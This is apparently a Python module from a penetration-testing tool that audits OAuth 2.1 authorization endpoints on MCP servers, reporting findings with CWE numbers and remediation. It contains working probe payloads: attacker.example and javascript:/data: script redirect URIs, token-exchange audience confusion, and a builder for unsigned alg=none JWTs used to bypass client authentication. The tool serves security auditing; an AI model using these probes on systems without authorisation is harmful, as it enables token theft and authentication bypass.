"""
OAuth 2.1 Flow Attacks (MCP 2025-06-18 authorization surface).

The 2025-06-18 MCP spec mandates OAuth 2.1 with PKCE for authenticated
servers. This attack audits every OAuth surface a server exposes:

  1. Authorization-server discovery (.well-known/oauth-authorization-server,
     .well-known/openid-configuration, .well-known/oauth-protected-resource)
  2. Issuer URL hygiene — must be HTTPS, must match advertised endpoints
  3. PKCE enforcement — does authorize endpoint reject `code_challenge`-less
     requests?
  4. Redirect-URI validation — open-redirector style payloads on the
     authorize endpoint
  5. Token-endpoint attacks — alg=none JWT, public-client without secret,
     audience confusion, refresh-token reuse semantics
  6. Bearer-token oracle — does the protected-resource endpoint leak
     "token expired" vs "token invalid" timing/wording?
  7. Scope downgrade — request a narrower scope, see if response upgrades it

This attack is read-only and never completes a real authorization (which
requires user consent). All tests target the metadata/token endpoints
directly and look for static / behavioural smell.

Dynamic params (set in UI):
  authorize_url, token_url, metadata_url     — override discovery
  redirect_test_uris                          — list of redirect candidates
  jwt_test                                    — try alg=none JWT bypass
  audience_test                               — try audience confusion
  scopes_to_request                           — list of scopes to enumerate
  follow_well_known                           — fetch every well-known path
  test_pkce, test_state, test_refresh         — toggle individual tests
"""

import json as _json
import time as _time
import uuid as _uuid
from urllib.parse import urlparse, urlencode, urljoin


_WELL_KNOWN_PATHS = (
    "/.well-known/oauth-authorization-server",
    "/.well-known/oauth-protected-resource",
    "/.well-known/openid-configuration",
)


def execute(target, params, context):
    rb = evidence.ReportBuilder(
        attack_id=context.get("attack_id", "oauth_flow_attacks"),
        target=target,
    )
    timeout = int(params.get("timeout", 20))
    follow_well_known = bool(params.get("follow_well_known", True))
    metadata_url = params.get("metadata_url") or ""
    authorize_url = params.get("authorize_url") or ""
    token_url = params.get("token_url") or ""
    redirect_test_uris = params.get("redirect_test_uris") or [
        "https://attacker.example/cb",
        "http://localhost:1234/cb",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ]
    test_pkce = bool(params.get("test_pkce", True))
    test_state = bool(params.get("test_state", True))
    test_jwt = bool(params.get("jwt_test", True))
    test_audience = bool(params.get("audience_test", True))
    test_refresh = bool(params.get("test_refresh", True))
    scopes_to_request = params.get("scopes_to_request") or [
        "openid", "profile", "email", "mcp:read", "mcp:tools",
    ]

    base = (target.get("base_url") or "").rstrip("/") or \
           f"{target.get('protocol','http')}://{target.get('host','localhost')}:{target.get('port',443)}"
    rb.info(f"OAuth audit of {base}")

    metadata = {}
    if follow_well_known:
        for path in _WELL_KNOWN_PATHS:
            url = metadata_url or urljoin(base + "/", path.lstrip("/"))
            r = _safe_get(url, timeout=timeout)
            rb.add_evidence(_ev_http(r, note=f"well-known {path}"))
            if r["status"] == 200:
                try:
                    body = _json.loads(r["body"])
                    metadata[path] = body
                    rb.info(f"Found {path} — {len(body)} keys")
                except Exception:
                    rb.warn(f"{path} returned 200 but body wasn't JSON")
            if metadata_url:
                break  # caller pinned a single URL

    # 1) Static metadata audit
    for path, body in metadata.items():
        _audit_metadata(path, body, rb, context, target)

    # 2) Resolve endpoints
    auth_md = (metadata.get("/.well-known/oauth-authorization-server")
               or metadata.get("/.well-known/openid-configuration") or {})
    res_md = metadata.get("/.well-known/oauth-protected-resource") or {}
    if not authorize_url:
        authorize_url = auth_md.get("authorization_endpoint") or ""
    if not token_url:
        token_url = auth_md.get("token_endpoint") or ""

    if not authorize_url and not token_url:
        rb.warn("No authorize_url / token_url discovered — pass them via params for active tests.")
        return rb.finalize()

    # 3) Redirect-URI validation
    if authorize_url:
        for ru in redirect_test_uris:
            _probe_redirect_uri(authorize_url, ru, rb, context, target, timeout)

    # 4) PKCE enforcement
    if authorize_url and test_pkce:
        _probe_pkce(authorize_url, redirect_test_uris[0], rb, context, target, timeout)

    # 5) state / CSRF param requirement
    if authorize_url and test_state:
        _probe_state(authorize_url, redirect_test_uris[0], rb, context, target, timeout)

    # 6) Token endpoint
    if token_url:
        _probe_token_endpoint(token_url, rb, context, target, timeout,
                              test_jwt=test_jwt, test_audience=test_audience,
                              test_refresh=test_refresh)

    # 7) Scope enumeration
    if authorize_url and scopes_to_request:
        _probe_scopes(authorize_url, scopes_to_request,
                      redirect_test_uris[0], rb, context, target, timeout)

    # 8) Protected-resource bearer oracle
    if res_md and res_md.get("resource"):
        _probe_bearer_oracle(res_md["resource"], rb, context, target, timeout)

    return rb.finalize()


# ---------------------------------------------------------------------------
# Metadata audits
# ---------------------------------------------------------------------------

def _audit_metadata(path, body, rb, context, target):
    issuer = body.get("issuer", "")
    if issuer and not issuer.startswith("https://"):
        rb.add_finding(evidence.Finding(
            attack_id=context.get("attack_id", "oauth_flow_attacks"),
            title="OAuth issuer is not HTTPS",
            category="oauth", severity="critical", confidence="confirmed",
            cwe="CWE-319",
            description=f"Issuer '{issuer}' uses plain HTTP. RFC 8414 requires "
                        "issuer URLs to be HTTPS. Plain-HTTP issuers enable "
                        "TLS-stripping attacks against the entire OAuth flow.",
            impact="Tokens issued by this server can be stolen by any in-path attacker.",
            remediation="Move authorization server behind TLS. Set issuer to HTTPS. "
                        "Add HSTS preload on the issuer host.",
            references=["https://datatracker.ietf.org/doc/html/rfc8414#section-3"],
            payload=path,
        ))

    sigs = body.get("id_token_signing_alg_values_supported") or []
    if "none" in [str(s).lower() for s in sigs]:
        rb.add_finding(evidence.Finding(
            attack_id=context.get("attack_id", "oauth_flow_attacks"),
            title="Authorization server advertises alg=none for ID tokens",
            category="oauth", severity="critical", confidence="confirmed",
            cwe="CWE-347",
            description="`alg=none` in `id_token_signing_alg_values_supported` "
                        "means the server can issue unsigned ID tokens. Any "
                        "client that does not strictly enforce a signing alg "
                        "can be tricked into accepting attacker-crafted tokens.",
            impact="Forge identity tokens for arbitrary users.",
            remediation="Remove `none` from the signing-alg list. Issue only ES256 / "
                        "RS256 / EdDSA tokens. Reject anything else server-side.",
            references=["https://datatracker.ietf.org/doc/html/rfc7515#section-10.6"],
            payload=str(sigs),
        ))

    methods = body.get("code_challenge_methods_supported") or []
    if not methods and "authorization_code" in (body.get("grant_types_supported") or []):
        rb.add_finding(evidence.Finding(
            attack_id=context.get("attack_id", "oauth_flow_attacks"),
            title="Authorization server does not advertise PKCE support",
            category="oauth", severity="high", confidence="high",
            cwe="CWE-352",
            description="No `code_challenge_methods_supported` advertised. "
                        "MCP 2025-06-18 mandates PKCE; native MCP clients must "
                        "have a PKCE-capable AS or fall back to a less-secure flow.",
            remediation="Advertise `S256` in code_challenge_methods_supported and "
                        "reject authorize requests without `code_challenge`.",
            payload=path,
        ))

    if "plain" in [str(m).lower() for m in methods]:
        rb.add_finding(evidence.Finding(
            attack_id=context.get("attack_id", "oauth_flow_attacks"),
            title="Authorization server allows PKCE method=plain",
            category="oauth", severity="high", confidence="confirmed",
            cwe="CWE-916",
            description="`plain` PKCE permits an attacker who steals an "
                        "authorization code to also use a trivially-derived "
                        "verifier. RFC 7636 Section 4.2 says servers SHOULD "
                        "only support `S256`.",
            remediation="Drop `plain` from code_challenge_methods_supported.",
            references=["https://datatracker.ietf.org/doc/html/rfc7636#section-4.2"],
            payload=str(methods),
        ))

    if not body.get("token_endpoint"):
        rb.warn(f"{path} has no token_endpoint")


# ---------------------------------------------------------------------------
# Active probes
# ---------------------------------------------------------------------------

def _probe_redirect_uri(authorize_url, redirect_uri, rb, context, target, timeout):
    state = _uuid.uuid4().hex[:12]
    params = {
        "response_type": "code",
        "client_id": "minerva-pentest",
        "redirect_uri": redirect_uri,
        "scope": "openid",
        "state": state,
        "code_challenge": _pkce_challenge("test-verifier-1234567890"),
        "code_challenge_method": "S256",
    }
    url = f"{authorize_url}?{urlencode(params)}"
    r = _safe_get(url, timeout=timeout, allow_redirects=False)
    rb.add_evidence(_ev_http(r, note=f"redirect probe → {redirect_uri}"))

    loc = (r.get("headers") or {}).get("location") or \
          (r.get("headers") or {}).get("Location") or ""
    if r["status"] in (301, 302, 303, 307, 308):
        # Did the server *bounce* to our attacker URL?
        if redirect_uri in loc or _same_host(redirect_uri, loc):
            sev = "critical" if redirect_uri.startswith(("javascript:", "data:")) \
                  else "high"
            rb.add_finding(evidence.Finding(
                attack_id=context.get("attack_id", "oauth_flow_attacks"),
                title=f"Open redirect / weak redirect_uri validation: {redirect_uri}",
                category="oauth", severity=sev, confidence="confirmed",
                cwe="CWE-601",
                description=(
                    f"Authorize endpoint accepted redirect_uri '{redirect_uri}' "
                    f"and returned a {r['status']} to '{loc[:200]}'. The server "
                    "is not enforcing a strict allow-list."
                ),
                impact="Attacker can phish a victim into completing a real auth "
                       "flow that lands the authorization code on attacker.example, "
                       "yielding full token theft.",
                remediation="Pin redirect_uri to an exact-match allow-list per "
                            "client_id. Reject `javascript:`, `data:`, and any "
                            "host the client did not register.",
                references=[
                    "https://datatracker.ietf.org/doc/html/rfc6819#section-4.1.5",
                ],
                payload=redirect_uri,
            ))


def _probe_pkce(authorize_url, redirect_uri, rb, context, target, timeout):
    """Authorize without PKCE — should be rejected on a 2025-06-18 server."""
    params = {
        "response_type": "code",
        "client_id": "minerva-pentest",
        "redirect_uri": redirect_uri,
        "scope": "openid",
        "state": _uuid.uuid4().hex[:8],
        # no code_challenge / code_challenge_method
    }
    url = f"{authorize_url}?{urlencode(params)}"
    r = _safe_get(url, timeout=timeout, allow_redirects=False)
    rb.add_evidence(_ev_http(r, note="authorize without PKCE"))
    # If the server returns 200 (login page) or a 302 with `code=...`,
    # it accepted the request — PKCE not enforced
    body = r.get("body", "")
    accepted = False
    if r["status"] in (200,):
        accepted = "login" in body.lower() or "authorize" in body.lower()
    elif r["status"] in (302, 303, 307):
        loc = (r.get("headers") or {}).get("location", "") or ""
        if "error=" not in loc:
            accepted = True
    if accepted:
        rb.add_finding(evidence.Finding(
            attack_id=context.get("attack_id", "oauth_flow_attacks"),
            title="Authorization server does not enforce PKCE",
            category="oauth", severity="high", confidence="high",
            cwe="CWE-345",
            description="Submitted an /authorize request with no code_challenge / "
                        "code_challenge_method. Server did not return invalid_request.",
            impact="Authorization code interception (e.g. via open-redirect or "
                   "browser malware) yields a usable code with no PKCE binding.",
            remediation="Make PKCE mandatory. Reject /authorize requests missing "
                        "code_challenge with HTTP 400 invalid_request.",
            references=["https://datatracker.ietf.org/doc/html/rfc7636"],
            payload="(no code_challenge in request)",
        ))


def _probe_state(authorize_url, redirect_uri, rb, context, target, timeout):
    params = {
        "response_type": "code",
        "client_id": "minerva-pentest",
        "redirect_uri": redirect_uri,
        "scope": "openid",
        "code_challenge": _pkce_challenge("v"*43),
        "code_challenge_method": "S256",
        # no state
    }
    url = f"{authorize_url}?{urlencode(params)}"
    r = _safe_get(url, timeout=timeout, allow_redirects=False)
    rb.add_evidence(_ev_http(r, note="authorize without state"))
    if r["status"] in (200, 302, 303, 307) and "error=" not in r.get("body", "").lower():
        rb.add_finding(evidence.Finding(
            attack_id=context.get("attack_id", "oauth_flow_attacks"),
            title="Authorization server does not require `state`",
            category="oauth", severity="medium", confidence="medium",
            cwe="CWE-352",
            description="A login-CSRF token (`state`) is not required. RFC 6749 "
                        "§10.12 says clients SHOULD use it; mature ASs reject "
                        "requests without it.",
            remediation="Reject /authorize requests missing `state`.",
            references=["https://datatracker.ietf.org/doc/html/rfc6749#section-10.12"],
        ))


def _probe_token_endpoint(token_url, rb, context, target, timeout,
                          *, test_jwt, test_audience, test_refresh):
    # Public client without client_secret — per spec only allowed for
    # confidential clients with another auth method (private_key_jwt etc.)
    r = _safe_post(token_url, data={
        "grant_type": "authorization_code",
        "code": "fake",
        "client_id": "minerva-pentest",
        "redirect_uri": "https://attacker.example/cb",
    }, timeout=timeout)
    rb.add_evidence(_ev_http(r, note="token endpoint without secret/PKCE"))
    body = r.get("body", "")
    if "client authentication failed" not in body.lower() \
            and "invalid_client" not in body.lower() \
            and "missing" not in body.lower() \
            and r["status"] != 401:
        rb.add_finding(evidence.Finding(
            attack_id=context.get("attack_id", "oauth_flow_attacks"),
            title="Token endpoint accepts unauthenticated public-client requests",
            category="oauth", severity="medium", confidence="medium",
            cwe="CWE-287",
            description="Token endpoint did not return invalid_client / 401 for "
                        "a public-client-style request with no secret and no PKCE "
                        "verifier.",
            remediation="Require either client_secret, private_key_jwt, or PKCE "
                        "code_verifier. Return invalid_client otherwise.",
            payload=str(r["body"])[:300],
        ))

    if test_jwt:
        # Try alg=none JWT in client_assertion
        evil_jwt = _alg_none_jwt({"iss": "minerva-pentest",
                                  "sub": "minerva-pentest",
                                  "aud": token_url,
                                  "exp": int(_time.time()) + 600})
        r = _safe_post(token_url, data={
            "grant_type": "client_credentials",
            "client_id": "minerva-pentest",
            "client_assertion_type":
                "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
            "client_assertion": evil_jwt,
        }, timeout=timeout)
        rb.add_evidence(_ev_http(r, note="token endpoint alg=none JWT bypass"))
        if r["status"] == 200 and "access_token" in r.get("body", ""):
            rb.add_finding(evidence.Finding(
                attack_id=context.get("attack_id", "oauth_flow_attacks"),
                title="Token endpoint accepts alg=none JWT client assertion",
                category="oauth", severity="critical", confidence="confirmed",
                cwe="CWE-347",
                description="Server accepted an unsigned JWT client_assertion and "
                            "issued an access_token. This bypasses client "
                            "authentication entirely.",
                impact="Attacker can mint tokens for any client_id without owning "
                       "its secret.",
                remediation="Reject `alg=none`. Pin allowed JWT signing algorithms "
                            "(ES256/RS256/EdDSA) per client.",
                payload=evil_jwt,
            ))

    if test_audience:
        # Audience confusion: send a token-exchange-style payload
        r = _safe_post(token_url, data={
            "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
            "subject_token": "fake.jwt.token",
            "subject_token_type": "urn:ietf:params:oauth:token-type:access_token",
            "audience": "https://attacker.example/api",
        }, timeout=timeout)
        rb.add_evidence(_ev_http(r, note="token endpoint audience confusion"))
        if r["status"] == 200 and "access_token" in r.get("body", ""):
            rb.add_finding(evidence.Finding(
                attack_id=context.get("attack_id", "oauth_flow_attacks"),
                title="Token-exchange endpoint allows arbitrary audience",
                category="oauth", severity="high", confidence="high",
                cwe="CWE-345",
                description="token-exchange grant type returned a token for "
                            "audience='https://attacker.example/api'. RFC 8693 "
                            "requires the AS to validate the requested audience "
                            "against client policy.",
                remediation="Whitelist audiences per requesting client.",
                references=["https://datatracker.ietf.org/doc/html/rfc8693"],
            ))


def _probe_scopes(authorize_url, scopes, redirect_uri, rb, context, target, timeout):
    granted = []
    for sc in scopes:
        params = {
            "response_type": "code",
            "client_id": "minerva-pentest",
            "redirect_uri": redirect_uri,
            "scope": sc,
            "state": _uuid.uuid4().hex[:8],
            "code_challenge": _pkce_challenge("v"*43),
            "code_challenge_method": "S256",
        }
        r = _safe_get(f"{authorize_url}?{urlencode(params)}",
                      timeout=timeout, allow_redirects=False)
        if r["status"] in (200, 302, 303, 307) and "invalid_scope" not in r.get("body","").lower():
            granted.append(sc)
        rb.add_evidence(_ev_http(r, note=f"scope probe: {sc}"))
    if granted:
        rb.info(f"Scopes the AS accepts (no `invalid_scope`): {granted}")
    # If the AS accepts every nonsense scope, it's not validating
    bogus = [s for s in scopes if s.startswith("mcp:")
             and s in granted]
    if len(bogus) >= 2:
        rb.add_finding(evidence.Finding(
            attack_id=context.get("attack_id", "oauth_flow_attacks"),
            title="Authorization server does not validate requested scopes",
            category="oauth", severity="medium", confidence="medium",
            cwe="CWE-285",
            description=f"AS accepted scopes {bogus} without returning "
                        "invalid_scope. Likely there is no scope whitelist.",
            remediation="Define a per-client scope whitelist. Reject unknown "
                        "scopes with invalid_scope.",
            payload=",".join(bogus),
        ))


def _probe_bearer_oracle(resource_url, rb, context, target, timeout):
    """Hit the protected resource three ways and compare error wording —
    a token oracle leaks `expired` vs `invalid` info."""
    cases = [
        ("none", {}),
        ("malformed", {"Authorization": "Bearer NOT_A_TOKEN"}),
        ("expired", {"Authorization":
                     "Bearer " + _alg_none_jwt({"exp": 1, "iss": "x"})}),
    ]
    bodies = {}
    for name, headers in cases:
        r = _safe_get(resource_url, timeout=timeout, headers=headers)
        bodies[name] = (r["status"], (r.get("body") or "")[:200])
        rb.add_evidence(_ev_http(r, note=f"bearer oracle: {name}"))
    if len({(s, b) for s, b in bodies.values()}) > 1 and \
            any("expired" in b.lower() for _, b in bodies.values()) and \
            any("invalid" in b.lower() for _, b in bodies.values()):
        rb.add_finding(evidence.Finding(
            attack_id=context.get("attack_id", "oauth_flow_attacks"),
            title="Bearer-token error oracle (distinguishes invalid vs expired)",
            category="oauth", severity="low", confidence="medium",
            cwe="CWE-209",
            description="Different error wording for missing / malformed / "
                        "expired tokens makes it easier for an attacker to "
                        "tell whether they have the right token format.",
            remediation="Return a uniform 401 with body `{\"error\":\"invalid_token\"}` "
                        "for every failure mode.",
            payload=str(bodies)[:500],
        ))


# ---------------------------------------------------------------------------
# Plumbing
# ---------------------------------------------------------------------------

def _safe_get(url, *, timeout=15, allow_redirects=True, headers=None):
    try:
        r = requests.get(url, timeout=timeout, allow_redirects=allow_redirects,
                         headers=headers or {})
        return {"url": url, "method": "GET", "status": r.status_code,
                "headers": dict(r.headers), "body": r.text[:8000]}
    except Exception as e:
        return {"url": url, "method": "GET", "status": None,
                "headers": {}, "body": "", "error": str(e)[:300]}


def _safe_post(url, *, data=None, timeout=15, headers=None):
    try:
        r = requests.post(url, data=data or {}, timeout=timeout,
                          headers=headers or {}, allow_redirects=False)
        return {"url": url, "method": "POST", "status": r.status_code,
                "headers": dict(r.headers), "body": r.text[:8000]}
    except Exception as e:
        return {"url": url, "method": "POST", "status": None,
                "headers": {}, "body": "", "error": str(e)[:300]}


def _ev_http(r, *, note=""):
    return evidence.ev_http(
        {"url": r.get("url"), "method": r.get("method")},
        {"status": r.get("status"),
         "headers": r.get("headers"),
         "body": (r.get("body") or "")[:2000],
         "error": r.get("error")},
        note=note,
    )


def _same_host(a, b):
    try:
        return urlparse(a).hostname == urlparse(b).hostname
    except Exception:
        return False


def _pkce_challenge(verifier: str) -> str:
    digest = hashlib.sha256(verifier.encode()).digest()
    return base64.urlsafe_b64encode(digest).rstrip(b"=").decode()


def _alg_none_jwt(payload: dict) -> str:
    h = base64.urlsafe_b64encode(_json.dumps({"alg": "none", "typ": "JWT"})
                                  .encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(_json.dumps(payload)
                                  .encode()).rstrip(b"=").decode()
    return f"{h}.{p}."
